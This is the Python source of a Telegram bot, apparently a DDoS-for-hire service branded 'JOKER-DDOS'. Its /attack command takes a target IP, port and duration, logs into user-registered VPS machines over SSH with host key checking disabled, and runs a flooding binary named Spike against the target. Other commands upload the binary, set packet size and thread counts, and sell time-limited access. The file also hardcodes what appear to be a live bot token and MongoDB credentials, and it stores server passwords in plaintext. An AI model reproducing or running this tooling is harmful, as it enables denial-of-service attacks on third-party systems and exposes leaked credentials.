import logging
import datetime
import asyncio
from pymongo import MongoClient
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import asyncssh
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
from pymongo import MongoClient
import time
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.helpers import escape_markdown
from bson import Binary
from telegram.ext import CallbackQueryHandler
from telegram.error import TelegramError
from telegram.constants import ParseMode

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = '7795656753:AAGHdpNiJLiN-OgBjB9T5SdjOXY85PhDBjg'  
MONGO_URI = "mongodb+srv://KalkiGamesYT:Redardo2305@test.hmv7x.mongodb.net/?retryWrites=true&w=majority&appName=Test"  # Replace with your MongoDB URI
DB_NAME = "TEST"
VPS_COLLECTION_NAME = "vps_list"
SETTINGS_COLLECTION_NAME = "settings"
USERS_COLLECTION_NAME = "broadcast"

client = MongoClient(MONGO_URI)
db = client[DB_NAME]
settings_collection = db[SETTINGS_COLLECTION_NAME]
vps_collection = db[VPS_COLLECTION_NAME]
users_collection = db[USERS_COLLECTION_NAME]

ADMIN_USER_ID = 7795055510  # Replace with your admin user ID
# A dictionary to track the last attack time for each user (Cooldown starts after attack completion)
last_attack_time = {}
SSH_SEMAPHORE = asyncio.Semaphore(100)

# Updated start function with Help button
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    # Define buttons for regular users
    user_keyboard = [
        [
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ]
    ]
    admin_keyboard = [
        [
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ]
    ]

    # Choose the appropriate keyboard
    keyboard = admin_keyboard if user_id == ADMIN_USER_ID else user_keyboard
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Enhanced message
    message = (
        "🔥 *Welcome to the Battlefield!* 🔥\n\n"
        "⚔️ Prepare for war! Use the buttons below to begin."
    )

    # Save or update the user in the database
    users_collection.update_one(
        {"user_id": user_id},  # Match by user_id
        {
            "$set": {
                "user_id": user_id,
                "chat_id": chat_id,
                "username": username,
                "first_name": first_name,
            }
        },
        upsert=True  # Insert if not found
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown", reply_markup=reply_markup)


async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()  # Acknowledge the callback

    user_id = update.effective_user.id  # Get the user ID

    if query.data == "help":
        await help_command(update, context)  # Call the help command

    elif query.data == "show_settings":
        await show_settings(update, context)
    elif query.data == "start_attack":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="*⚠️ Use /attack <ip> <port> <duration>*",
            parse_mode="Markdown"
        )
    elif query.data == "setup":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="*ℹ️ Use /setup commands to set up VPS for attack.*",
            parse_mode="Markdown"
        )
    elif query.data == "configure_vps":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="*🔧 Use /add_vps to configure your VPS settings.*",
            parse_mode="Markdown"
        )
    elif query.data == "vps_status":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="*🔧 Use /vps_status to see VPS details.*",
            parse_mode="Markdown"
        )
    user_id = update.effective_user.id

    # Define help menu for users and admins
async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id  # Get user ID
    query = update.callback_query  # Get callback query if triggered from a button

    user_help_text = (
        "ℹ️ *Help Menu*\n\n"
        "*🔸 /attack <ip> <port> <duration>* - Launch an attack.\n"
    )

    admin_help_text = (
        "ℹ️ *Admin Help Menu*\n\n"
        "*🔸 /add_vps* - Add your VPS for attacks.\n"
        "*🔸 /setup* - Set up your VPS for attack configuration.\n"
        "*🔸 /attack <ip> <port> <duration>* - Launch an attack.\n"
        "*🔸 /vps_status* - Check the status of your VPS.\n"
        "*🔸 /show* - View attack settings.\n"
        "*🔸 /add <user_id> <expiry_time>* - Add a user with access.\n"
        "*🔸 /remove <user_id>* - Remove a user.\n"
        "*🔸 /users* - List users with access.\n"
        "*🔸 /broadcast <message>* - Send a message to all users.\n"
        "*🔸 /broadcast_media* - Send media to all users.\n\n"
        "*🔸 /byte <size>* - Set the packet size for attacks.\n"
        "*🔸 /thread <count>* - Set the thread count for attacks.\n"
        "*🔸 /upload* - Upload required files for attacks.\n\n"
        "For more commands, contact the admin."
    )

    help_text = admin_help_text if user_id == ADMIN_USER_ID else user_help_text

    if query:
        await context.bot.send_message(chat_id=query.message.chat_id, text=help_text, parse_mode="Markdown")
    else:
        await update.message.reply_text(help_text, parse_mode="Markdown")
        
async def remove_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user has a VPS entry
    vps_data = vps_collection.find_one({"user_id": user_id})
    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ *No VPS found to remove.*",
            parse_mode="Markdown"
        )
        return

    # Remove the VPS entry
    vps_collection.delete_one({"user_id": user_id})
    
    await context.bot.send_message(
        chat_id=chat_id,
        text="✅ *Your VPS has been removed successfully.*",
        parse_mode="Markdown"
    )

async def broadcast_media(update: Update, context: CallbackContext):
    """Admin ke reply kiya hua media sabhi users ko broadcast kare."""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    # Check karo ki admin ne kisi media pe reply kiya hai ya nahi
    if not update.message.reply_to_message:
        await update.message.reply_text("⚠️ Please reply to a photo, video, audio, or document with /broadcast_media.")
        return

    media_message = update.message.reply_to_message
    users = users_collection.find()
    success_count = 0
    failure_count = 0

    # Sabhi users ko media bhejne ka loop
    for user in users:
        try:
            chat_id = user.get("chat_id")
            if not chat_id:
                continue  

            if media_message.photo:
                file_id = media_message.photo[-1].file_id
                await context.bot.send_photo(chat_id=chat_id, photo=file_id)

            elif media_message.video:
                file_id = media_message.video.file_id
                await context.bot.send_video(chat_id=chat_id, video=file_id)

            elif media_message.audio:
                file_id = media_message.audio.file_id
                await context.bot.send_audio(chat_id=chat_id, audio=file_id)

            elif media_message.document:
                file_id = media_message.document.file_id
                await context.bot.send_document(chat_id=chat_id, document=file_id)

            success_count += 1
        except Exception as e:
            print(f"Failed to send media to {user.get('user_id', 'unknown')} due to {e}")
            failure_count += 1

    await update.message.reply_text(
        text=f"✅ *Media Broadcast completed!*\n📤 Sent to: {success_count}\n❌ Failed: {failure_count}",
        parse_mode=ParseMode.MARKDOWN,
    )
    
async def vps_status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch all VPS details for the user
    vps_data = list(vps_collection.find({"user_id": user_id}))

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ *No VPS configured!*\nUse /add_vps to add your VPS details and get started.",
            parse_mode="Markdown",
        )
        return

    message = "🌐 *Your VPS List:*\n"
    for vps in vps_data:
        vps_number = vps.get("vps_number", "N/A")
        ip = vps.get("ip", "N/A")
        username = vps.get("username", "N/A")
        in_use = "✅ In Use" if vps.get("in_use", False) else "🆓 Available"

        message += (
            f"\n🖥️ *VPS{vps_number}:*\n"
            f"🔹 *IP:* `{ip}`\n"
            f"👤 *Username:* `{username}`\n"
            f"⚡ *Status:* {in_use}\n"
            "───────────────"
        )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")
async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /thread <number>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"threads": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Thread count set to {threads}!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for threads!*", parse_mode='Markdown')


async def set_byte(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /byte <number>*", parse_mode='Markdown')
        return

    try:
        packet_size = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"packet_size": packet_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Packet size set to {packet_size} bytes!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for packet size!*", parse_mode='Markdown')
async def show_settings(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return
    
    # Retrieve the current settings from MongoDB
    settings = settings_collection.find_one()  # Get the first (and only) document in the settings collection
    
    if not settings:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Settings not found!*", parse_mode='Markdown')
        return
    
    threads = settings.get("threads", "Not set")
    packet_size = settings.get("packet_size", "Not set")
    
    # Send the settings to the user
    message = (
        f"*⚙️ Current Settings:*\n"
        f"*Threads:* {threads}\n"
        f"*Packet Size:* {packet_size} bytes"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add_vps <ip> <username> <password>*", parse_mode='Markdown')
        return

    ip, username, password = args

    # Fetch existing VPS list for the user
    existing_vps = list(vps_collection.find({"user_id": user_id}))

    if len(existing_vps) >= 4:
        await context.bot.send_message(chat_id=chat_id, text="*🚫 Bot Server is busy. Try again later!*", parse_mode='Markdown')
        return

    # Assign next VPS number
    vps_number = len(existing_vps) + 1  

    # Save new VPS
    vps_collection.insert_one({
        "user_id": user_id,
        "vps_number": vps_number,
        "ip": ip,
        "username": username,
        "password": password,
        "in_use": False  # Default: Not in use
    })

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ VPS{vps_number} added successfully!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Admin bypass restrictions
    if user_id == ADMIN_USER_ID:
        max_duration = None  # No limit for admin
        cooldown_time = 0  # No cooldown for admin
    else:
        max_duration = 120  # Max attack duration for regular users
        cooldown_time = 300  # Cooldown period for regular users

    current_time = time.time()
    if user_id in last_attack_time and current_time - last_attack_time[user_id] < cooldown_time:
        remaining_cooldown = cooldown_time - (current_time - last_attack_time[user_id])
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ You must wait {int(remaining_cooldown)} seconds before launching another attack.*",
            parse_mode="Markdown"
        )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /attack <ip> <port> <duration>*",
            parse_mode="Markdown"
        )
        return

    target_ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Restrict attack duration for non-admins
    if max_duration and user_id != ADMIN_USER_ID and duration > max_duration:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ You can't attack for more than {max_duration} seconds!*",
            parse_mode="Markdown"
        )
        return

    vps_list = list(vps_collection.find({"user_id": user_id}))

    if not vps_list:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You don't have access to any VPS. Contact the owner or use /add_vps.*",
            parse_mode="Markdown"
        )
        return

    settings = settings_collection.find_one() or {}
    threads = settings.get("threads", 10)
    packet_size = settings.get("packet_size", 512)

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {target_ip}:{port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*🚀 VPS Used: {len(vps_list)}*\n"
            f"*💥 Powered By JOKER-DDOS*"
        ),
        parse_mode="Markdown",
    )

    # Launch attack from all VPS
    for vps in vps_list:
        asyncio.create_task(run_ssh_attack(vps, target_ip, port, duration, threads, packet_size, chat_id, context))

    last_attack_time[user_id] = current_time


async def run_ssh_attack(vps, target_ip, port, duration, threads, packet_size, chat_id, context):
    """Run the attack command on multiple VPS asynchronously."""
    async with SSH_SEMAPHORE:  # Limit concurrent SSH connections
        try:
            async with asyncssh.connect(
                vps["ip"],
                username=vps["username"],
                password=vps["password"],
                known_hosts=None
            ) as conn:
                command = f"./Spike {target_ip} {port} {duration} {packet_size} {threads}"
                result = await conn.run(command, check=True)
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"*✅ Attack completed from {vps['ip']}!*",
                    parse_mode="Markdown"
                )
        except asyncssh.Error as e:
            logger.error(f"SSH Error on {vps['ip']}: {e}")
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*❌ SSH Error on {vps['ip']}: {str(e)}*",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"General Error on {vps['ip']}: {e}")
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*❌ Error on {vps['ip']}: {str(e)}*",
                parse_mode="Markdown"
            )

# Command for admins to upload the Spike binary
async def upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to use this command!*", parse_mode="Markdown")
        return

    await context.bot.send_message(chat_id=chat_id, text="✅ *Send the Spike binary now.*", parse_mode="Markdown")

# Handle binary file uploads
async def handle_file_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to upload files!*", parse_mode="Markdown")
        return

    document = update.message.document
    if document.file_name != "Spike":
        await context.bot.send_message(chat_id=chat_id, text="❌ *Please upload the correct file (Spike binary).*", parse_mode="Markdown")
        return

    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()

    # Replace the old binary with the new one in MongoDB
    result = settings_collection.update_one(
        {"name": "binary_spike"},  # Query by a unique identifier
        {"$set": {"binary": Binary(file_content)}},  # Replace the binary content with the new one
    )

    if result.matched_count > 0:
        await context.bot.send_message(chat_id=chat_id, text="✅ *Spike binary replaced successfully.*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Failed to replace the binary. No matching document found.*", parse_mode="Markdown")

async def setup(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch the user's VPS details
    vps_data = vps_collection.find_one({"user_id": user_id})

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No VPS configured! Add your VPS details and get started."),
            parse_mode="Markdown",
        )
        return

    # Fetch the stored Spike binary from MongoDB
    spike_binary_doc = settings_collection.find_one({"name": "binary_spike"})
    if not spike_binary_doc:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No Spike binary found! Admin must upload it first."),
            parse_mode="Markdown",
        )
        return

    spike_binary = spike_binary_doc["binary"]
    ip = vps_data.get("ip")
    username = vps_data.get("username")
    password = vps_data.get("password")

    try:
        async with asyncssh.connect(
            ip,
            username=username,
            password=password,
            known_hosts=None  # Disable host key checking
        ) as conn:
            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown("🔄 Uploading Spike binary..."),
                parse_mode="Markdown",
            )

            # Upload the Spike binary
            async with conn.start_sftp_client() as sftp:
                async with sftp.open("Spike", "wb") as remote_file:
                    await remote_file.write(spike_binary)

            # Set permissions for the uploaded Spike binary
            await conn.run("chmod +x Spike", check=True)

            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown("✅ Spike binary uploaded and permissions set successfully."),
                parse_mode="Markdown",
            )

    except asyncssh.Error as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown(f"❌ SSH Error: {str(e)}"),
            parse_mode="Markdown",
        )
    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown(f"❌ Error: {str(e)}"),
            parse_mode="Markdown",
        )

async def broadcast(update: Update, context: CallbackContext):
    """Broadcast a message to all users."""
    # Ensure the user sending the broadcast is an admin
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    # Extract the message to broadcast
    if context.args:
        message_text = " ".join(context.args)
    else:
        await update.message.reply_text("⚠️ Please provide a message to broadcast.")
        return

    # Fetch all users from the database
    users = users_collection.find()
    success_count = 0
    failure_count = 0

    # Broadcast the message
    for user in users:
        try:
            chat_id = user.get("chat_id")
            if not chat_id:
                continue  # Skip users without a chat_id

            await context.bot.send_message(
                chat_id=chat_id,
                text=message_text,
                parse_mode=ParseMode.MARKDOWN,
            )
            success_count += 1
        except Exception as e:
            print(f"Failed to send message to {user.get('user_id', 'unknown')} due to {e}")
            failure_count += 1

    # Completion message with counts
    await update.message.reply_text(
        text=(
            f"✅ *Broadcast completed!*\n"
            f"📤 Sent to: {success_count}\n"
            f"❌ Failed: {failure_count}"
        ),
        parse_mode=ParseMode.MARKDOWN,
    )

async def add_friend(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    owner_id = update.effective_user.id

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /add <user_id> <m/d>*",
            parse_mode="Markdown"
        )
        return

    friend_id = int(args[0])
    expiry_time = args[1]

    # Calculate expiry timestamp
    current_time = datetime.datetime.utcnow()
    if "m" in expiry_time:
        expiry = current_time + datetime.timedelta(minutes=int(expiry_time.replace("m", "")))
    elif "d" in expiry_time:
        expiry = current_time + datetime.timedelta(days=int(expiry_time.replace("d", "")))
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Invalid expiry time format. Use 1m or 1d.*",
            parse_mode="Markdown"
        )
        return

    # Fetch VPS data
    vps_data = vps_collection.find_one({"user_id": owner_id})
    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ No VPS configured. Use /add_vps to add one!*",
            parse_mode="Markdown"
        )
        return

    # Check if user already exists
    friends = vps_data.get("friends", [])
    for friend in friends:
        if friend["user_id"] == friend_id:
            # Update expiry time for existing user
            friend["expiry"] = expiry
            vps_collection.update_one(
                {"user_id": owner_id},
                {"$set": {"friends": friends}}
            )
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*✅ User {friend_id}'s access extended until {expiry}.*",
                parse_mode="Markdown"
            )
            return

    # Add new user to the list
    vps_collection.update_one(
        {"user_id": owner_id},
        {"$push": {"friends": {"user_id": friend_id, "expiry": expiry}}}
    )
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*✅ User {friend_id} has been granted access to your VPS until {expiry}.*",
        parse_mode="Markdown"
    )

async def list_users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    owner_id = update.effective_user.id

    # Fetch VPS data
    vps_data = vps_collection.find_one({"user_id": owner_id})
    if not vps_data or "friends" not in vps_data or not vps_data["friends"]:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*📂 No users have been granted access to your VPS.*",
            parse_mode="Markdown"
        )
        return

    # Prepare a dictionary to store the latest expiry time for each user
    current_time = datetime.datetime.utcnow()
    active_users = []
    for friend in vps_data["friends"]:
        user_id = friend["user_id"]
        expiry = friend.get("expiry")
        if expiry and current_time < expiry:
            active_users.append(f"✅ User ID: {user_id} | ⏳ Expiry: {expiry.date()}")

    # Check if there are active users
    if not active_users:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*📂 No users currently have active access to your VPS.*",
            parse_mode="Markdown"
        )
        return

    # Prepare and send the message
    users_message = "*🔑 Users with VPS Access:*\n" + "\n".join(active_users)
    await context.bot.send_message(
        chat_id=chat_id,
        text=users_message,
        parse_mode="Markdown"
    )


async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    owner_id = update.effective_user.id

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /remove <user_id>*",
            parse_mode="Markdown"
        )
        return

    friend_id = int(args[0])

    # Fetch VPS data
    vps_data = vps_collection.find_one({"user_id": owner_id})
    if not vps_data or "friends" not in vps_data or not vps_data["friends"]:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ No users to remove.*",
            parse_mode="Markdown"
        )
        return

    # Remove the user
    updated_friends = [friend for friend in vps_data["friends"] if friend["user_id"] != friend_id]
    vps_collection.update_one({"user_id": owner_id}, {"$set": {"friends": updated_friends}})

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*✅ User {friend_id} has been removed from your VPS access list.*",
        parse_mode="Markdown"
    )

# Background task to remove expired users
async def remove_expired_users():
    while True:
        current_time = datetime.datetime.utcnow()
        # Fetch all VPS entries
        all_vps = vps_collection.find()

        for vps_data in all_vps:
            friends = vps_data.get("friends", [])
            updated_friends = [
                friend for friend in friends
                if "expiry" in friend and current_time < friend["expiry"]
            ]

            # Update the database if any expired users were removed
            if len(updated_friends) != len(friends):
                vps_collection.update_one(
                    {"_id": vps_data["_id"]},
                    {"$set": {"friends": updated_friends}}
                )

        # Wait 30 seconds before the next cleanup
        await asyncio.sleep(30)

# Modify main function to include the background task
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("add_vps", add_vps))
    application.add_handler(CommandHandler("vps_status", vps_status))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("broadcast_media", broadcast_media))
    application.add_handler(CommandHandler("upload", upload)) 
    application.add_handler(CommandHandler("setup", setup))
    application.add_handler(CommandHandler("add", add_friend))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("remove_vps", remove_vps))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    
    application.add_handler(CallbackQueryHandler(button_handler))

    # Start the background task
    loop = asyncio.get_event_loop()
    loop.create_task(remove_expired_users())

    # Run the bot
    application.run_polling()


if __name__ == '__main__':
    main()
